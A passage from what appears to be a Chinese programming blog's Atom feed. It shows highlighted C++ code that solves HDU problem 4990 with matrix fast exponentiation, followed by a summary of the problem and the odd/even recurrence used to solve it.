&lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; b.m; j++) tmp.a[i][j] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</div><div class="line">                <span class="keyword">if</span> (!a[i][j]) <span class="keyword">continue</span>;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; b.m; k++)</div><div class="line">                    tmp.a[i][k] += a[i][j] * b.a[j][k], tmp.a[i][k] %= mod;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> tmp;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Copy</span><span class="params">(<span class="keyword">const</span> Matrix &amp;b)</span> </span>&#123;</div><div class="line">        n = b.n, m = b.m;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) a[i][j] = b.a[i][j];</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unit</span><span class="params">(<span class="keyword">int</span> sz)</span> </span>&#123;</div><div class="line">        n = m = sz;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) a[i][j] = <span class="number">0</span>;</div><div class="line">            a[i][i] = <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line">Matrix A, B;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">    A.n = A.m = <span class="number">2</span>;</div><div class="line">    A.a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">4</span>;</div><div class="line">    A.a[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">    A.a[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    A.a[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="function">Matrix <span class="title">Matrix_pow</span><span class="params">(Matrix A, ll k, ll mod)</span> </span>&#123; <span class="comment">//矩阵快速幂</span></div><div class="line">    Matrix res;</div><div class="line">    res.clear();</div><div class="line">    res.n = res.m = <span class="number">2</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) res.a[i][i] = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(k) &#123;</div><div class="line">        <span class="keyword">if</span> (k &amp; <span class="number">1</span>) res.Copy(A * res);</div><div class="line">        k &gt;&gt;= <span class="number">1</span>;</div><div class="line">        A.Copy(A * A);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    init();</div><div class="line">    <span class="keyword">int</span> n, m;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m)) &#123;</div><div class="line">        mod = m;</div><div class="line">        Matrix ans = Matrix_pow(A, n / <span class="number">2</span>, mod);</div><div class="line">        ll res;</div><div class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span>) res = ans.a[<span class="number">0</span>][<span class="number">0</span>] * <span class="number">1</span> + ans.a[<span class="number">0</span>][<span class="number">1</span>] * <span class="number">1</span>;</div><div class="line">        <span class="keyword">else</span> res = ans.a[<span class="number">0</span>][<span class="number">1</span>] * <span class="number">2</span>;</div><div class="line">        res = (res + mod) % mod;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, res);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=4990&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=4990&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定n，按照以下程序算出ans。（n为int）&lt;br&gt;    ans=0;&lt;br&gt;    for(i=1;i&amp;lt;=n;i++)&lt;br&gt;    {&lt;br&gt;      if(i&amp;amp;1)ans=(ans&lt;em&gt;2+1)%m;&lt;br&gt;      else ans=ans&lt;/em&gt;2%m;&lt;br&gt;    }&lt;br&gt;    printf(“%d\n”,ans);&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;分奇偶讨论&lt;br&gt;当n为奇数时：fn=4&lt;em&gt;fn-1 + 1，首项为1&lt;br&gt;当n为偶数时：fn=4&lt;/em&gt;fn-1 + 2，首项为2&lt;br&gt;之后就矩阵快速幂加速运算即可。&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="数学" scheme="http://yoursite.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="矩阵" scheme="http://yoursite.com/tags/%E7%9F%A9%E9%98%B5/"/>
    
  </entry>
  
</feed>
